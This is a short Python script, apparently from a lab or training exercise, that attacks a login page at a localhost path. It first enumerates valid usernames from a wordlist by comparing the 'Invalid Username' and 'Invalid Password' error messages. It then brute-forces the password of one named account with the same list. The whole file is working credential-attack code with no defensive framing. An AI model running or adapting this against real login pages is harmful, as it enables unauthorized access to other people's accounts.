import requests

users = open("users.txt", 'r').read().split('\n')

def Scrap(user, url):
    try:
        params = {
            'username': f"{user}",
            'password': 'Mostafa',
            'login': 'Login'
        }

        req = requests.post(url, data=params).text
        if "Invalid Username" in req:
            print(f"Invalid Username ===> {user}")
        elif "Invalid Password" in req:
            print(f"Valid Username ===> {user}")
            exit()
        else:
            print(req)
    except Exception as e:
        print(e)

#url = "http://localhost/CIS/ch1/login.php"
#for user in users:
#    Scrap(user, url)


def Password(password, url):
    try:
        params = {
            'username': "crespod",
            'password': f'{password}',
            'login': 'Login'
        }

        req = requests.post(url, data=params).text
        if "Invalid Password" in req:
            print(f"Invalid Password ===> {password}")
        else:
            print(f"Valid Password ===> {password}")
            exit()

    except Exception as e:
        print(e)

url = "http://localhost/CIS/ch1/login.php"
for password in users:
    Password(password, url)